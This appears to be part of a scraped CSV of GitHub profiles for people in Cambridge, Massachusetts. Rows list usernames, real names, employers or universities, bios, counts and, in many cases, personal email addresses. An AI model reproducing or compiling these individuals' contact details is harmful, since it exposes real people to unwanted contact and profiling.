+mattfeng,Matthew Feng,Massachusetts Institute of Technology,,"Cambridge, Massachusetts",Cambridge,MA,mattfeng@mit.edu,"""For my part I know nothing with any certainty, but the sight of the stars makes me dream.""
+
+- Vincent Van Gogh",165,20,https://github.com/mattfeng,filled
+aditya-saxena-7,Aditya Saxena,world-quant @upskillr-ai ,,"Cambridge, Massachusetts, USA",Cambridge,MA,adityasaxena@g.harvard.edu,Professional Coin Flipper,27,20,https://github.com/aditya-saxena-7,filled
+kafleprabhakar,Prabhakar Kafle,,,"Cambridge, Massachusetts",Cambridge,MA,,,11,19,https://github.com/kafleprabhakar,filled
+sygreer,Sarah Greer,,,"Cambridge, Massachusetts",Cambridge,MA,sygreer@mit.edu,,7,19,https://github.com/sygreer,filled
+18jeffreyma,Jeffrey Ma,,,"Cambridge, Massachusetts",Cambridge,MA,18jeffreyma@gmail.com,,59,19,https://github.com/18jeffreyma,filled
+adamfreedman,Adam H. Freedman,Harvard University,,"Cambridge, Massachusetts USA",Cambridge,MA,adamfreedman@fas.harvard.edu,"evolutionary geneticist, genome hacker, bioinformatics guy",3,19,https://github.com/adamfreedman,filled
+ksauravt,Saurav Kumar ,Hult international business school,,"Cambridge Massachusetts, United State",Cambridge Massachusetts,UN,,,18,18,https://github.com/ksauravt,filled
+mit-jp,MIT Joint Program on the Science and Policy of Global Change,,,"Cambridge, Massachusetts, USA",Cambridge,MA,globalchange@MIT.EDU,"We combine scientific research on changes to land, air, and water with innovative policy analysis to confront the global climate challenge.",18,18,https://github.com/mit-jp,filled
+hollandjg,John Gerrard Holland,brown-ccv @BrownUniversity ,I'm a data scientist at @brown-ccv working on interpretable AI and earth observation,"Cambridge, Massachusetts",Cambridge,MA,,I'm a data scientist at @brown-ccv working on interpretable AI and earth observation.,12,18,https://github.com/hollandjg,filled
+keshavramaswamy,Keshav Ramaswamy,Infor Dynamic Science Labs,Data Scientist @ Infor Dynamic Science Labs,"Cambridge, Massachusetts",Cambridge,MA,keshav.ramaswamy@gmail.com,"Data Scientist @ Infor Dynamic Science Labs. I try to contribute (although in a minimal way) to open source projects like Pandas, Jupyter when I find time",52,18,https://github.com/keshavramaswamy,filled
+KevinMMendez,Kevin Milton Mendez,,,"Cambridge, Massachusetts, United States",Cambridge,MA,,Research Fellow at Harvard Medical School,23,17,https://github.com/KevinMMendez,filled
+SwarmArch,Swarm Architecture Team,,,"MIT CSAIL, Cambridge, Massachusetts, USA",MIT CSAIL,CA,,,11,17,https://github.com/SwarmArch,filled
+dat-tran05,Dat Tran,,,"Cambridge, Massachusetts",Cambridge,MA,,CS @ MIT,8,17,https://github.com/dat-tran05,filled
+kaimit,kaixiang,MIT,,"Cambridge, Massachusetts",Cambridge,MA,xiangk07@gmail.com,,22,17,https://github.com/kaimit,filled
+jingoro,John Nishinaga,,,"Cambridge, Massachusetts, United States",Cambridge,MA,jingoro@casa-z.org,,26,16,https://github.com/jingoro,filled
+sriramelango,Sriram Elango,TheGalileoProject,Researcher and Programmer,"Cambridge, Massachusetts, United States",Cambridge,MA,sriram@fireflies.ai,Researcher and Programmer,17,16,https://github.com/sriramelango,filled
+AYZhu,Alan Zhu,MIT,,"Cambridge, Massachusetts",Cambridge,MA,alanyzhu@mit.edu,,36,16,https://github.com/AYZhu,filled
+AjinkyaZ,Ajinkya Zadbuke,Pryon Inc.,Machine Learning Engineer at Pryon Inc,"Cambridge, Massachusetts, USA",Cambridge,MA,ajinkya.zadbuke@gmail.com,"Machine Learning Engineer at Pryon Inc.
+I'm extremely interested in AI, Language and Learning.  
+MS CS - University of Massachusetts, Amherst",14,16,https://github.com/AjinkyaZ,filled
+carina-kauf,Carina Kauf,Massachusetts Institute of Technology | Brain and Cognitive Sciences,,"Cambridge, Massachusetts",Cambridge,MA,,"PhD, Dept. of Brain and Cognitive Sciences, MIT",20,16,https://github.com/carina-kauf,filled
+panand2257,Pratyush Anand,MIT,,"Cambridge, Massachusetts",Cambridge,MA,,I am a PhD student at @MIT in the Quantum Photonics Group @QPG-MIT ,11,15,https://github.com/panand2257,filled
+arnavbansal1,Arnav Bansal,,,"Cambridge, Massachusetts",Cambridge,MA,arnavbansal1@gmail.com,"Harvard '25
+/ TJHSST '20",11,15,https://github.com/arnavbansal1,filled
+hlbao,Honglin Bao,Harvard Business School,,"Cambridge, Massachusetts",Cambridge,MA,,"I study Innovation + (AI, Networks, Organizations)",39,14,https://github.com/hlbao,filled
+javidlakha,Javid Lakha,,,"Cambridge, Massachusetts",Cambridge,MA,,,15,14,https://github.com/javidlakha,filled
+niko-dellic,NIKO,,I do architecture and computer stuff,"Cambridge, Massachusetts",Cambridge,MA,,I do architecture and computer stuff,22,14,https://github.com/niko-dellic,filled
+tbl3rd,Tom Lyons,BASH ON REGARDLESS,,Cambridge Massachusetts USA,Cambridge Massachusetts USA,,,"simple, legible leverage on computing",45,14,https://github.com/tbl3rd,filled
+williamsanchez090,William Sanchez,Resilient Coders,"I am a software engineer at Resilient coders looking to have great conversations, and make connectio",Cambridge Massachusetts,Cambridge Massachusetts,,williamsanchezdev@gmail.com,"I am a software engineer at Resilient coders looking to have great conversations, and make connections within the software engineering community",32,13,https://github.com/williamsanchez090,filled
+junmoan,Junmo An,Philips Healthcare,,"Cambridge, Massachusetts",Cambridge,MA,,,70,13,https://github.com/junmoan,filled
+asuradev99,Aditya Suresh,,,"Cambridge, Massachusetts",Cambridge,MA,ethanaditya@gmail.com,"Hi, I'm Ethan",20,12,https://github.com/asuradev99,filled
+charlesterrill,Charles Terrill,CHT4 Corporation ,"Humanitarian, Inventor, Engineer, CEO, CTO","One Broadway / Kendall Square, Cambridge, MA ",One Broadway / Kendall Square,CA,,"Humanitarian, Inventor, Engineer, CEO, CTO",0,1,https://github.com/charlesterrill,filled
+SmugFish,,,,"Kendall Square - Cambridge, MA",Kendall Square - Cambridge,MA,,,1,0,https://github.com/SmugFish,filled
+irshaffe,,,,Kendall Square,Kendall Square,,,,0,0,https://github.com/irshaffe,filled
+JackGrayBP,Jack Gray,Brain Power,Yet another software developer,Kendall Square Cambridge MA,Kendall Square Cambridge MA,,,Yet another software developer,0,0,https://github.com/JackGrayBP,filled
+ybolishetti13,Yashwant Bolishetti,Cogo Labs,,1 Kendall Square,1 Kendall Square,,,I am a high school student being forced to write this bio by Github.,0,0,https://github.com/ybolishetti13,filled
